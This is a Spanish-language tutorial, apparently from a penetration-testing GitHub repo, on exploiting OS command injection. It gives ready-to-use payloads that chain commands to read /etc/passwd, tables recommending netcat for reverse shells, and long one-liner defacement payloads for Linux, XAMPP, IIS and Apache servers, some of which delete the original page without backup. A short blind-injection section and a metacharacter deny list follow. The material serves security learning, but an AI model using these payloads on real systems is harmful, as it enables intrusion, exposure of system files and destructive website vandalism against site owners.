# Fz3r0 OWASP 💀🐝 - Command Injection 💉

## 💀 ¿Cómo explotar vulnerabilidad CMDI?

Una vez que se encontró la vulnerabilidad `in-band` o `blind` se procede a explotar de las siguientes maneras: 

## 💣 `In-Band CMDI: exploitation`

1. 💥 Utilizar `shell metacharacters` como [payload](https://github.com/Fz3r0/Fz3r0_-_Command_Injection/blob/main/12_Fz3r0_CMDI_-_Payloads/Command_Injection_Payloads.md) inicial:

````py
## General deny list to be included for command injection:
| ; & $ > < ' \ ! >> #

## Escape or filter special characters for --->>> Windows
( ) < > & * ‘ | = ? ; [ ] ^ ~ ! . " % @ / \ : + , `

## Escape or filter special characters for --->>> Linux
{ } ( ) > < & * ‘ | = ? ; [ ] $ – # ~ ! . " %  / \ : + , `

````

2. 💥 **Concatenar** comandos:

````py
## Concatena 127.0.0.1 + cat /etc/passwd + (concatena lo que sigue en el comando original con un &)

### Opción 1:
127.0.0.1 && cat /etc/passwd &

### Opción 2:
127.0.0.1 & cat /etc/passwd &

### Opción 3:
127.0.0.1 || cat /etc/passwd &

### Opción 4:
127.0.0.1 | cat /etc/passwd &

### Opción 4:
127.0.0.1 | cat /etc/passwd &

.
.
.

etc

````

### Ejemplos de payloads:

- `Linux`:

| **Payload** | **Descripción**                                                                                                                                                                                                                       |   |
|-------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---|
| whoami      | Muestra el usuario bajo el cual se está ejecutando la aplicación.                                                                                                                                                                     |   |
| ls          | Lista el contenido del directorio actual. Puedes encontrar archivos como configuraciones, tokens y claves de aplicaciones, y muchas otras cosas valiosas.                                                                             |   |
| ping        | Este comando provocará que la aplicación se quede colgada. Útil para probar una aplicación en busca de una inyección de comandos a ciegas.                                                                                            |   |
| sleep       | Otro payload útil para probar una aplicación en busca de una inyección de comandos a ciegas, especialmente si la máquina no tiene instalado el comando ping.                                                                          |   |
| nc          | Netcat se puede usar para generar una shell inversa en la aplicación vulnerable. Puedes utilizar este punto de apoyo para moverte por la máquina objetivo y buscar otros servicios, archivos o posibles formas de elevar privilegios. |   |

- `Windows`:

| **Payload** | **Descripción**                                                                                                                                                                                                                       |   |
|-------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---|
| whoami      | Muestra el usuario bajo el cual se está ejecutando la aplicación.                                                                                                                                                                     |   |
| dir         | Lista el contenido del directorio actual. Puedes encontrar archivos como configuraciones, tokens y claves de aplicaciones, y muchas otras cosas valiosas.                                                                             |   |
| ping        | Este comando provocará que la aplicación se quede colgada. Útil para probar una aplicación en busca de una inyección de comandos a ciegas.                                                                                            |   |
| timeout     | Este comando también provocará que la aplicación se quede colgada. Es útil para probar una aplicación en busca de una inyección de comandos a ciegas si el comando ping no está instalado.                                            |   |
| nc          | Netcat se puede usar para generar una shell inversa en la aplicación vulnerable. Puedes utilizar este punto de apoyo para moverte por la máquina objetivo y buscar otros servicios, archivos o posibles formas de elevar privilegios. |   | 

Algo un poco mas complejo como un `defacement` se podría ver algo así:

1. Buscar por algún archivo con la extensión `*.html` / buscar directamente por el `*.index.html` / mapear directorio default para hosting de página. 

````sh
# Ejemplo 1
127.0.0.1 ; find / -type f -name "*.html" &

# Ejemplo 2
127.0.0.1 ; ls /var/www/ &

````

2. Crear un nuevo `index.html` con el defacement utilizando un `one-liner`, el original se guarda en un backup `.bak`:

````sh
127.0.0.1 ; cp /var/www/html/index.html /var/www/html/index.bak && echo "Hola mundo, soy Fz3r0" > /var/www/html/index.html &

````

O algo todavía más complejo, esto ya es un código HTML para un buen defacement _(aquí borramos la página original sin guardar backup, solo por chingar)_:

- **`Linux`:**

````sh
127.0.0.1 ; rm /var/www/html/index.html && echo '<!DOCTYPE html><html><head><title>Este es un título de prueba</title><style>body{background-color:black;color:white;}h1{color:yellow;}h2{color:cyan;}</style></head><body><h1>Este es el titulo Fz3r0</h1><h2>Este es el titulo 2 Fz3r0</h2><p style="color:red;">Este es el contenido en rojo y yo soy Fz3r0</p><img src="https://ejemplo.com/imagen.jpg" alt="Imagen de ejemplo"></body></html>' > /var/www/html/index.html &

````

- **`Windows`:**

````cmd
## XAMPP copiando original:
127.0.0.1 & ren C:\xampp\htdocs\index.html index.bak & copy NUL C:\xampp\htdocs\index.html & echo ^<!DOCTYPE html^><html><head><title>Este es un título de prueba</title><style>body{background-color:black;color:white;}h1{color:yellow;}h2{color:cyan;}</style></head><body><h1>Este es el título Fz3r0</h1><h2>Este es el título 2 Fz3r0</h2><p style="color:red;">Este es el contenido en rojo y yo soy Fz3r0</p><img src="https://ejemplo.com/imagen.jpg" alt="Imagen de ejemplo"></body></html> > C:\xampp\htdocs\index.html &

## XAMPP borrando original:
127.0.0.1 & copy NUL C:\xampp\htdocs\index.html & echo ^<!DOCTYPE html^><html><head><title>Este es un título de prueba</title><style>body{background-color:black;color:white;}h1{color:yellow;}h2{color:cyan;}</style></head><body><h1>Este es el título Fz3r0</h1><h2>Este es el título 2 Fz3r0</h2><p style="color:red;">Este es el contenido en rojo y yo soy Fz3r0</p><img src="https://ejemplo.com/imagen.jpg" alt="Imagen de ejemplo"></body></html> > C:\xampp\htdocs\index.html &

## IIS borrando original:
127.0.0.1 & copy NUL C:\inetpub\wwwroot\index.html & echo ^<!DOCTYPE html^><html><head><title>Este es un título de prueba</title><style>body{background-color:black;color:white;}h1{color:yellow;}h2{color:cyan;}</style></head><body><h1>Este es el título Fz3r0</h1><h2>Este es el título 2 Fz3r0</h2><p style="color:red;">Este es el contenido en rojo y yo soy Fz3r0</p><img src="https://ejemplo.com/imagen.jpg" alt="Imagen de ejemplo"></body></html> > C:\inetpub\wwwroot\index.html &

## Apache copiando original:
127.0.0.1 & ren C:\mi_apache\www\index.html index.bak & copy NUL C:\mi_apache\www\index.html & echo ^<!DOCTYPE html^><html><head><title>Este es un título de prueba</title><style>body{background-color:black;color:white;}h1{color:yellow;}h2{color:cyan;}</style></head><body><h1>Este es el título Fz3r0</h1><h2>Este es el título 2 Fz3r0</h2><p style="color:red;">Este es el contenido en rojo y yo soy Fz3r0</p><img src="https://ejemplo.com/imagen.jpg" alt="Imagen de ejemplo"></body></html> > C:\mi_apache\www\index.html &

````

## 💣 `Out-Of-Band AKA "Blind" CMDI: exploitation`

La inyección de comandos a ciegas o `blind`, ocurre cuando se produce una inyección de comandos; sin embargo, no hay una salida visible, por lo que no es inmediatamente detectable. Por ejemplo, se ejecuta un comando, pero la aplicación web no muestra ningún mensaje.

Para este tipo de inyección de comandos, necesitaremos utilizar payloads que causen cierto retraso en el tiempo. Por ejemplo, los comandos `ping` y `sleep` son payloads que normalmente se utilizan para probar. 

- Usando `ping` como ejemplo, la aplicación se quedará colgada durante x segundos en relación con la cantidad de pings que hayas especificado.

Otro método para detectar la inyección de comandos a ciegas es forzando alguna salida o `output`. Esto se puede lograr utilizando operadores de redirección como `>` de Linux. 

- Por ejemplo, podemos indicarle a la aplicación web que ejecute comandos como `whoami` y redireccionarlos a un archivo.
- Luego, podemos utilizar un comando como `cat` para leer el contenido de este archivo recién creado.
- El comando `curl` es una excelente manera de probar la inyección de comandos. Esto se debe a que puedes usar `curl` para enviar y recibir datos desde una aplicación en tu payload.
- Probar la inyección de comandos de esta manera a menudo es complicado y requiere bastante experimentación, especialmente porque la sintaxis de los comandos varía entre `Linux` y `Windows`.

Por ejemplo, un payload simple de curl a una aplicación es posible para la inyección de comandos como el siguiente:

````sh
curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
````

## 📖 Recursos

- [Port Swigger - Command Injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP - Command Injection Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [OWASP - Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)
- [Udemy - Rana Khalil | Command Injection ](https://www.udemy.com/course/mastering-command-injection-the-ultimate-hands-on-course/learn/lecture/39297722#overview)
